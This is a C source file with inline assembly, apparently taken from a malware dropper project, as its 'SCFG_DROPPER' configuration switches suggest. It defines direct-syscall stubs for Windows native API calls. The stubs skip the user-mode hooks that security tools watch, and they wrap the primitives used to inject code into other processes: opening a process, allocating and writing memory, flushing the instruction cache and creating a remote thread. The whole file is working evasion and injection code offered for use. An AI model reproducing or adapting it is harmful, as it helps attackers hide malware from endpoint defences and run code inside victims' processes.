#include <config.h>
#include <fastcall.h>
#include <ntapi.h>
#include "ntapi.h"

enum {
    Teb32Wow64ReservedOffset = FIELD_OFFSET(TEB32,  WOW32Reserved),
};

#if SCFG_DROPPER_NTAPI_INIT_USE_PROCLOAD == ON
    #ifdef _AMD64_
        #define NTAPI_STUB_SOURCE(PROCINDEX, X86_ARGSIZE)                            \
            {                                                                        \
                __asm { jmp qword ptr NtapiSyscallsAddressStorage[PROCINDEX << 3] }; \
            }
    #else
        #define NTAPI_STUB_SOURCE(PROCINDEX, X86_ARGSIZE)                            \
            {                                                                        \
                __asm { jmp dword ptr NtapiSyscallsAddressStorage[PROCINDEX << 2] }; \
            }
    #endif
#else
    #ifdef _AMD64_
        #define NTAPI_STUB_SOURCE(PROCINDEX, X86_ARGSIZE)                                 \
            {                                                                             \
                __asm { cmp dword ptr [Config.NtVersion.bIsDeprecated], TRUE           }; \
                __asm { jne L1                                                         }; \
                __asm { jmp qword ptr NtapiSyscallsAddressStorage[PROCINDEX << 3]      }; \
            L1:                                                                           \
                __asm { mov r10,rcx                                                    }; \
                __asm { mov rax, qword ptr NtapiSyscallsAddressStorage[PROCINDEX << 3] }; \
                __asm { syscall                                                        }; \
                __asm { ret                                                            }; \
            }
    #else
        #if SCFG_DROPPER_NTAPI_STUB_X86_USE_WOW64 == ON
            #define NTAPI_STUB_SOURCE(PROCINDEX, X86_ARGSIZE)                                 \
                {                                                                             \
                    __asm { cmp dword ptr [Config.NtVersion.bIsDeprecated], TRUE           }; \
                    __asm { jne L1                                                         }; \
                    __asm { jmp dword ptr NtapiSyscallsAddressStorage[PROCINDEX << 2]      }; \
                L1:                                                                           \
                    __asm { mov eax, dword ptr NtapiSyscallsAddressStorage[PROCINDEX << 2] }; \
                    __asm { cmp dword ptr [Config.NtVersion.dwCommonIndex], 0              }; \
                    __asm { je L2                                                          }; \
                    __asm { call dword ptr fs:[Teb32Wow64ReservedOffset]                   }; \
                    __asm { ret X86_ARGSIZE                                                }; \
                L2:                                                                           \
                    __asm { xor ecx, ecx                                                   }; \
                    __asm { lea edx, [esp + 4]                                             }; \
                    __asm { call dword ptr fs:[Teb32Wow64ReservedOffset]                   }; \
                    __asm { add esp, 4                                                     }; \
                    __asm { ret X86_ARGSIZE                                                }; \
                }
        #else
            #define NTAPI_STUB_SOURCE(PROCINDEX, X86_ARGSIZE)                                 \
                {                                                                             \
                    __asm { cmp dword ptr [Config.NtVersion.bIsDeprecated], TRUE           }; \
                    __asm { jne L1                                                         }; \
                    __asm { jmp dword ptr NtapiSyscallsAddressStorage[PROCINDEX << 2]      }; \
                L1:                                                                           \
                    __asm { mov eax, dword ptr NtapiSyscallsAddressStorage[PROCINDEX << 2] }; \
                    __asm { call KiFastSystemCall                                          }; \
                    __asm { ret X86_ARGSIZE                                                }; \
                }
            #endif
    #endif
#endif

PRAGMA_WARNING_DISABLE_PUSH(869) // parameter "X" was never referenced

NTSTATUS
NTAPISTUB
NtClose(
    IN HANDLE Handle
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x04);
}

NTSTATUS
NTAPISTUB
NtAllocateVirtualMemory(
    IN HANDLE    ProcessHandle,
    IO PVOID    *BaseAddress,
    IN ULONG_PTR ZeroBits,
    IO PSIZE_T   RegionSize,
    IN ULONG     AllocationType,
    IN ULONG     Protect
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x18);
}

NTSTATUS
NTAPISTUB
NtFreeVirtualMemory(
    IN HANDLE  ProcessHandle,
    IO PVOID  *BaseAddress,
    IO PSIZE_T RegionSize,
    IN ULONG   FreeType
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x10);
}

NTSTATUS
NTAPISTUB
NtWriteVirtualMemory(
    IN      HANDLE  ProcessHandle,
    IN      PVOID   BaseAddress,
    IN      PVOID   Buffer,
    IN      ULONG   NumberOfBytesToWrite,
    OUT OPT PULONG  NumberOfBytesWritten
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x14);
}

NTSTATUS
NTAPISTUB
NtFlushInstructionCache(
    IN HANDLE ProcessHandle,
    IN PVOID  BaseAddress,
    IN ULONG  NumberOfBytesToFlush
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x0C);
}

NTSTATUS
NTAPISTUB
NtCreateThreadEx(
    OUT     HANDLE      hThread,
    IN      ACCESS_MASK DesiredAccess,
    IN  OPT POBJECT_ATTRIBUTES ObjectAttributes,
    IN      HANDLE      ProcessHandle,
    IN      PVOID       StartAddress,
    IN  OPT PVOID       Arguments,
    IN      ULONG       CreateFlags,
    IN      ULONG       StackZeroBits,
    IN      ULONG       SizeOfStackCommit,
    IN      ULONG       SizeOfStackReserve,
    IN  OPT PPS_ATTRIBUTE_LIST AttributeList
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x2C);
}

NTSTATUS
NTAPISTUB
NtOpenProcess(
    OUT PHANDLE            ProcessHandle,
    IN  ACCESS_MASK        DesiredAccess,
    NON POBJECT_ATTRIBUTES ObjectAttributes, // set ObjectName to NULL, not ObjectAttributes
    IN  PCLIENT_ID         ClientId
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x10);
}

NTSTATUS
NTAPISTUB
NtQuerySystemInformation(
    IN  SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT PVOID                    SystemInformation,
    IN  ULONG                    SystemInformationLength,
    OUT PULONG                   ReturnLength
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x10);
}

NTSTATUS
NTAPISTUB
NtQueryInformationProcess(
    IN  HANDLE           ProcessHandle,
    IN  PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID            ProcessInformation,
    IN  ULONG            ProcessInformationLength,
    OUT PULONG           ReturnLength
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x14);
}

NTSTATUS
NTAPISTUB
NtWriteFile(
    IN      HANDLE           FileHandle,
    IN  OPT HANDLE           Event,
    IN  OPT PIO_APC_ROUTINE  ApcRoutine,
    IN  OPT PVOID            ApcContext,
    OUT     PIO_STATUS_BLOCK IoStatusBlock,
    OUT     PVOID            Buffer,
    IN      ULONG            Length,
    IN  OPT PLARGE_INTEGER   ByteOffset,
    IN  OPT PULONG           Key
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x24);
}

NTSTATUS
NTAPISTUB
NtReadFile(
    IN      HANDLE           FileHandle,
    IN  OPT HANDLE           Event,
    IN  OPT PIO_APC_ROUTINE  ApcRoutine,
    IN  OPT PVOID            ApcContext,
    OUT     PIO_STATUS_BLOCK IoStatusBlock,
    OUT     PVOID            Buffer,
    IN      ULONG            Length,
    IN  OPT PLARGE_INTEGER   ByteOffset,
    IN  OPT PULONG           Key
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x24);
}

NTSTATUS
NTAPISTUB
NtCreateFile(
    OUT PHANDLE            FileHandle,
    IN  ACCESS_MASK        DesiredAccess,
    IN  POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK   IoStatusBlock,
    IN  PLARGE_INTEGER     AllocationSize,
    IN  ULONG              FileAttributes,
    IN  ULONG              ShareAccess,
    IN  ULONG              CreateDisposition,
    IN  ULONG              CreateOptions,
    IN  PVOID              EaBuffer,
    IN  ULONG              EaLength
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x2C);
}

NTSTATUS
NTAPISTUB
NtQueryDirectoryFile(
    IN      HANDLE           FileHandle,
    IN  OPT HANDLE           Event,
    IN  OPT PIO_APC_ROUTINE  ApcRoutine,
    IN  OPT PVOID            ApcContext,
    OUT     PIO_STATUS_BLOCK IoStatusBlock,
    OUT     PVOID            FileInformation,
    IN      ULONG            Length,
    IN      FILE_INFORMATION_CLASS FileInformationClass,
    IN      BOOLEAN          ReturnSingleEntry,
    IN  OPT PUNICODE_STRING  FileMask,
    IN      BOOLEAN          RestartScan
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x2C);
}

PRAGMA_WARNING_DISABLE_POP(869)
